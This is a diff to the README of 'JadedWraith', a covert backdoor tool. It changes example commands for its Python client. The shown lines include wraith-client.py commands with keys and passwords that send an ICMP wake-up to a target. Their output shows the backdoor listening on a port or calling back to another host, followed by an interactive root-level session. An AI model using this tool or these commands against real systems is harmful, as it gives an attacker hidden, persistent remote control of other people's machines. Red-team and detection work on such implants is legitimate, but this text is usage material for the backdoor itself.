@@ -45,7 +45,7 @@ argv[0] (Leave blank to not spoof command) [] :
 JadedWraith Executable : /tmp/JadedWraith/configured/builds/JadedWraith-2.0.0-Linux-x86_64.1627752415.bin
 
 Try me!
-   sudo ./wraith-client.py <IP_ADDRESS> -k 95454c93c8d5d30a0782da72ade10e29 -P 4Zw2TTtaIKBcyeoLwd7rrTasRlUF90vSZnLFzn2A4ab018Vj shell
+   sudo ./wraith-client.py <IP_ADDRESS> -k 95454c93c8d5d30a0782da72ade10e29 -P 4Zw2TTtaIKBcyeoLwd7rrTasRlUF90vSZnLFzn2A4ab018Vj
 ```
 
 ## How to install
@@ -64,7 +64,7 @@ The `wraith-client.py` script inside `client` can be used to interact with Jaded
 
 
 ```
-$ ~/JadedWraithFork/client> sudo ./wraith-client.py 192.168.100.224 -k 1deeb4a64440b8d13c84a8eb4e7c4453 -P y00nrnwpwXdvPOXSS6K0r7LelFeCBvKx91Oj0s5BrnLyx1WR shell
+$ ~/JadedWraithFork/client> sudo ./wraith-client.py 192.168.100.224 -k 1deeb4a64440b8d13c84a8eb4e7c4453 -P y00nrnwpwXdvPOXSS6K0r7LelFeCBvKx91Oj0s5BrnLyx1WR
 [+] sent ICMP wake up command to 192.168.100.224
 [*] backdoor will listen on port 58290
 [*] connecting to 192.168.100.224:58290
@@ -78,7 +78,7 @@ USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
 UID          PID    PPID  C STIME TTY          TIME CMD
 root           1       0  0 11:20 ?        00:00:01 /usr/lib/systemd/systemd --switched-root --system --deserialize 31
 >> .exit
-$ sudo ./wraith-client.py 127.0.0.1 --callback 192.168.100.224 -k 1deeb4a64440b8d13c84a8eb4e7c4453 -P y00nrnwpwXdvPOXSS6K0r7LelFeCBvKx91Oj0s5BrnLyx1WR shell
+$ sudo ./wraith-client.py 127.0.0.1 --callback 192.168.100.224 -k 1deeb4a64440b8d13c84a8eb4e7c4453 -P y00nrnwpwXdvPOXSS6K0r7LelFeCBvKx91Oj0s5BrnLyx1WR
 [+] sent ICMP wake up command to 127.0.0.1
 [*] backdoor will connect to port 37943
 [*] listening on port 37943
